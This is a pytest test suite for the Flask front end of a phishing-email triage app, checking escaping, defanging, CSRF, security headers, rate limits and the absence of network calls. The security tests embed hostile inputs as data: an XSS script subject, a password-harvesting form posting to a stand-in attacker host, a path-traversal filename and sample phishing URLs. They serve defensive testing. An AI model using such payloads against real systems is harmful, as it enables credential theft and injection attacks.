"""Web front end.

The emphasis is on the input surface rather than the detection logic, which is
already covered elsewhere. This application is handed live phishing mail by
design, so the tests that matter are the ones proving hostile content cannot
escape the page, cannot reach the network, and cannot be replayed by a third
party's site.
"""

from __future__ import annotations

import io
import json

import pytest

flask = pytest.importorskip("flask", reason="web extra not installed")

from webapp import Config, create_app  # noqa: E402

from .conftest import SAMPLES, build_eml  # noqa: E402


@pytest.fixture
def app():
    application = create_app(Config(
        secret_key="test-key-not-a-secret",
        org_domains=("example-corp.com",),
        allow_online_checks=False,
        rate_limit_requests=1000,
    ))
    application.config["TESTING"] = True
    return application


@pytest.fixture
def client(app):
    return app.test_client()


def csrf(client) -> str:
    page = client.get("/").get_data(as_text=True)
    marker = 'name="csrf_token" value="'
    start = page.index(marker) + len(marker)
    return page[start:page.index('"', start)]


def upload(client, *names, **data):
    files = [
        (io.BytesIO((SAMPLES / name).read_bytes()), name)
        for name in names
    ]
    payload = {"csrf_token": csrf(client), "messages": files, **data}
    return client.post("/analyze", data=payload,
                       content_type="multipart/form-data", follow_redirects=False)


class TestPages:
    def test_index_renders(self, client):
        response = client.get("/")
        assert response.status_code == 200
        assert b"Phishing email triage" in response.data

    def test_indicator_catalogue_lists_every_rule(self, client):
        from phishtriage import catalog

        body = client.get("/indicators").get_data(as_text=True)
        for indicator in catalog.all_indicators():
            assert indicator.id in body

    def test_healthz(self, client):
        payload = client.get("/healthz").get_json()
        assert payload["status"] == "ok"
        assert payload["indicators"] > 0

    def test_unknown_report_token_is_404_not_500(self, client):
        assert client.get("/report/does-not-exist").status_code == 404


class TestAnalysisFlow:
    def test_single_upload_redirects_to_a_report(self, client):
        response = upload(client, "credential-phish.eml")
        assert response.status_code == 303
        report = client.get(response.headers["Location"])
        assert report.status_code == 200
        assert b"Malicious" in report.data

    def test_batch_upload_renders_a_ranked_table(self, client):
        response = upload(client, "credential-phish.eml", "benign-newsletter.eml",
                          "bec-wire-fraud.eml")
        body = client.get(response.headers["Location"]).get_data(as_text=True)
        assert "3 messages analysed" in body
        # Worst first: the malicious sample must precede the benign one.
        assert body.index("credential-phish.eml") < body.index("benign-newsletter.eml")

    def test_pasted_message_is_analysed(self, client):
        raw = (SAMPLES / "credential-phish.eml").read_text(encoding="utf-8", errors="replace")
        response = client.post("/analyze", data={
            "csrf_token": csrf(client), "raw_message": raw,
        }, follow_redirects=True)
        assert response.status_code == 200
        assert b"Malicious" in response.data

    def test_empty_submission_is_rejected(self, client):
        response = client.post("/analyze", data={"csrf_token": csrf(client)})
        assert response.status_code == 400

    def test_unparseable_input_is_422_not_500(self, client):
        response = client.post("/analyze", data={
            "csrf_token": csrf(client),
            "messages": (io.BytesIO(b"\x00\x01\x02 not a message"), "junk.eml"),
        }, content_type="multipart/form-data")
        assert response.status_code in (303, 422)

    def test_unsupported_extension_is_refused(self, client):
        response = client.post("/analyze", data={
            "csrf_token": csrf(client),
            "messages": (io.BytesIO(b"MZ..."), "payload.exe"),
        }, content_type="multipart/form-data")
        assert response.status_code == 400

    def test_downloads_are_offered_as_attachments(self, client):
        location = upload(client, "credential-phish.eml").headers["Location"]
        token = location.rsplit("/", 1)[-1]

        as_json = client.get(f"/report/{token}/download/0.json")
        assert as_json.status_code == 200
        assert "attachment" in as_json.headers["Content-Disposition"]
        assert json.loads(as_json.get_data(as_text=True))["verdict"]["label"] == "Malicious"

        as_html = client.get(f"/report/{token}/download/0.html")
        assert as_html.status_code == 200
        assert b"<style>" in as_html.data

        iocs = client.get(f"/report/{token}/download/iocs.json")
        assert iocs.status_code == 200
        assert isinstance(json.loads(iocs.get_data(as_text=True)), list)

    def test_discarding_a_result_removes_it(self, client):
        token = upload(client, "credential-phish.eml").headers["Location"].rsplit("/", 1)[-1]
        assert client.get(f"/report/{token}").status_code == 200
        client.post(f"/report/{token}/delete", data={"csrf_token": csrf(client)})
        assert client.get(f"/report/{token}").status_code == 404


class TestOutputSafety:
    def test_no_live_url_from_the_message_reaches_the_page(self, client):
        location = upload(client, "credential-phish.eml").headers["Location"]
        body = client.get(location).get_data(as_text=True)
        # The only permitted absolute links are the app's own.
        for fragment in ("https://login.microsoftonline.com.account-verify",
                         "https://collect.mail-verify-desk.top"):
            assert fragment not in body
        assert "hxxps[://]" in body

    def test_defanged_at_sign_survives_templating(self, client):
        location = upload(client, "credential-phish.eml").headers["Location"]
        body = client.get(location).get_data(as_text=True)
        assert "alerts[@]micros0ft-security[.]tk" in body

    def test_html_in_a_subject_is_escaped(self, client):
        raw = build_eml(
            {"From": "a@example.com", "Subject": "<script>alert(1)</script>"},
            "body text",
        ).decode()
        response = client.post("/analyze", data={
            "csrf_token": csrf(client), "raw_message": raw,
        }, follow_redirects=True)
        body = response.get_data(as_text=True)
        assert "<script>alert(1)</script>" not in body
        assert "&lt;script&gt;" in body

    def test_message_html_body_is_never_rendered(self, client):
        """The body is reported *about*, never reproduced as markup."""
        raw = build_eml(
            {"From": "a@example.com", "Subject": "hi"},
            '<form action="https://evil.tk/x"><input type="password" name="password"></form>',
            content_type="text/html",
        ).decode()
        response = client.post("/analyze", data={
            "csrf_token": csrf(client), "raw_message": raw,
        }, follow_redirects=True)
        body = response.get_data(as_text=True)
        assert '<input type="password"' not in body
        assert '<form action="https://evil.tk/x"' not in body

    def test_a_traversal_filename_cannot_escape_the_label(self, client):
        response = client.post("/analyze", data={
            "csrf_token": csrf(client),
            "messages": (io.BytesIO((SAMPLES / "benign-newsletter.eml").read_bytes()),
                         "../../../../etc/passwd.eml"),
        }, content_type="multipart/form-data", follow_redirects=True)
        body = response.get_data(as_text=True)
        assert "../.." not in body
        assert "passwd.eml" in body


class TestSecurityControls:
    def test_security_headers_are_set(self, client):
        headers = client.get("/").headers
        assert "default-src 'none'" in headers["Content-Security-Policy"]
        assert "'unsafe-inline'" not in headers["Content-Security-Policy"]
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["Referrer-Policy"] == "no-referrer"
        assert "no-store" in headers["Cache-Control"]

    def test_post_without_a_csrf_token_is_rejected(self, client):
        client.get("/")  # establish a session
        response = client.post("/analyze", data={
            "messages": (io.BytesIO(b"From: a@b.com\r\n\r\nhi"), "m.eml"),
        }, content_type="multipart/form-data")
        assert response.status_code == 403

    def test_post_with_a_wrong_csrf_token_is_rejected(self, client):
        client.get("/")
        response = client.post("/analyze", data={
            "csrf_token": "not-the-right-token",
            "messages": (io.BytesIO(b"From: a@b.com\r\n\r\nhi"), "m.eml"),
        }, content_type="multipart/form-data")
        assert response.status_code == 403

    def test_oversized_upload_is_413(self, app):
        client = app.test_client()
        token = csrf(client)  # obtain a valid token *before* tightening the limit,
        app.config["MAX_CONTENT_LENGTH"] = 2048  # so size is the only failing condition
        response = client.post("/analyze", data={
            "csrf_token": token, "messages": (io.BytesIO(b"A" * 8192), "big.eml"),
        }, content_type="multipart/form-data")
        assert response.status_code == 413

    def test_rate_limit_returns_429(self, app):
        app.extensions["phish_triage"]["limiter"].limit = 2
        app.extensions["phish_triage"]["limiter"].reset()
        client = app.test_client()
        token = csrf(client)
        codes = [
            client.post("/analyze", data={"csrf_token": token}).status_code
            for _ in range(4)
        ]
        assert 429 in codes

    def test_online_checks_cannot_be_forced_when_disabled(self, client):
        location = upload(client, "credential-phish.eml", online="on").headers["Location"]
        body = client.get(location).get_data(as_text=True)
        assert "offline analysis" in body

    def test_analysis_makes_no_network_calls(self, client, monkeypatch):
        import socket

        def blocked(*args, **kwargs):
            raise AssertionError("the web app attempted a network connection")

        monkeypatch.setattr(socket, "create_connection", blocked)
        assert upload(client, "credential-phish.eml").status_code == 303


class TestAPI:
    def test_json_body_analysis(self, client):
        raw = (SAMPLES / "credential-phish.eml").read_text(encoding="utf-8", errors="replace")
        response = client.post("/api/analyze", json={"raw": raw})
        assert response.status_code == 200
        payload = response.get_json()
        assert payload["verdict"]["label"] == "Malicious"
        assert payload["findings"]

    def test_api_output_is_defanged_by_default(self, client):
        raw = (SAMPLES / "credential-phish.eml").read_text(encoding="utf-8", errors="replace")
        blob = json.dumps(client.post("/api/analyze", json={"raw": raw}).get_json())
        assert "http://" not in blob and "https://" not in blob

    def test_api_defang_can_be_disabled_explicitly(self, client):
        raw = (SAMPLES / "credential-phish.eml").read_text(encoding="utf-8", errors="replace")
        payload = client.post("/api/analyze?defang=0", json={"raw": raw}).get_json()
        assert any(u["url"].startswith("http") for u in payload["urls"])

    def test_api_rejects_an_empty_request(self, client):
        assert client.post("/api/analyze", json={}).status_code == 400

    def test_api_reports_unparseable_input_as_422(self, client):
        response = client.post("/api/analyze", json={"raw": "\x00\x01 nonsense"})
        assert response.status_code in (200, 422)

    def test_api_indicators_matches_the_catalogue(self, client):
        from phishtriage import catalog

        payload = client.get("/api/indicators").get_json()
        assert len(payload) == len(catalog.all_indicators())

    def test_api_errors_are_json_not_html(self, client):
        response = client.get("/api/nope")
        assert response.status_code == 404


class TestStaticAssets:
    def test_stylesheet_does_not_animate_layout_properties(self, client):
        """Animating width/height/margin forces layout on every frame.

        The score bar deliberately uses a transform instead; this keeps it that
        way, since the CSS is easy to "fix" back to something that looks
        identical and janks.
        """
        css = client.get("/static/app.css").get_data(as_text=True)
        import re

        for block in re.findall(r"transition:\s*([^;}]+)", css):
            for prop in ("width", "height", "margin", "padding", "top", "left"):
                assert prop not in block, f"transition animates layout property: {block.strip()}"

    def test_score_bar_is_hidden_until_scripted(self, client):
        """An unpainted bar sits at scaleX(0) and would read as a score of 0."""
        css = client.get("/static/app.css").get_data(as_text=True)
        assert "visibility: hidden" in css
        assert ".bar.is-painted" in css
        js = client.get("/static/app.js").get_data(as_text=True)
        assert "is-painted" in js
        assert "scaleX(" in js

    def test_no_external_resources_are_referenced(self, client):
        """CSP would block them anyway; this catches it at review time."""
        for asset in ("/static/app.css", "/static/app.js"):
            body = client.get(asset).get_data(as_text=True)
            assert "http://" not in body
            assert "https://" not in body
            assert "@import" not in body


class TestResultStore:
    def test_results_expire(self):
        from webapp.store import ResultStore

        store = ResultStore(ttl_seconds=0, max_entries=10)
        token = store.put(["report"])
        assert store.get(token) is None

    def test_store_is_bounded(self):
        from webapp.store import ResultStore

        store = ResultStore(ttl_seconds=600, max_entries=3)
        tokens = [store.put([f"r{i}"]) for i in range(5)]
        assert len(store) == 3
        assert store.get(tokens[0]) is None
        assert store.get(tokens[-1]) is not None

    def test_rate_limiter_windows(self):
        from webapp.store import RateLimiter

        limiter = RateLimiter(limit=2, window=60)
        assert limiter.check("a") and limiter.check("a")
        assert not limiter.check("a")
        assert limiter.check("b")  # independent key
